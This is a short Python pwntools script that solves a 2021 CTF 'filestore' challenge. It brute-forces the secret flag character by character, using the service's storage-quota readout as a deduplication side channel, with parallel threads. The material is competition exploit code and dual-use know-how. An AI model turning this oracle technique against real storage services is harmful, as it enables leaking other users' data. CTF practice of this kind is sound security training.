from pwn import *
import string
from concurrent.futures import ThreadPoolExecutor

chs = "{_}" + string.digits + string.ascii_lowercase + string.ascii_uppercase
flag = "CTF"


def guess_flag(flag):
    context.log_level = "error"
    # io = process(["python", "filestore.py"])
    io = remote("filestore.2021.ctfcompetition.com", 1337)
    io.sendlineafter(b"Menu", "status")
    io.recvuntil(b"Quota: ")
    orig = float(io.recvuntilS(b"kB/")[:-3])
    io.sendlineafter(b"Menu", "store")
    io.sendlineafter(b"line of data", flag)
    io.sendlineafter(b"Menu", "status")
    io.recvuntil(b"Quota: ")
    new = float(io.recvuntilS(b"kB/")[:-3])
    # io.kill()
    io.close()
    return new == orig


while not flag.endswith("}"):
    with ThreadPoolExecutor(max_workers=16) as ex:
        gen = ex.map(guess_flag, [(flag + c)[-16:] for c in chs])
        for x, c in zip(gen, chs):
            if x:
                flag += c
                break
    print(flag)
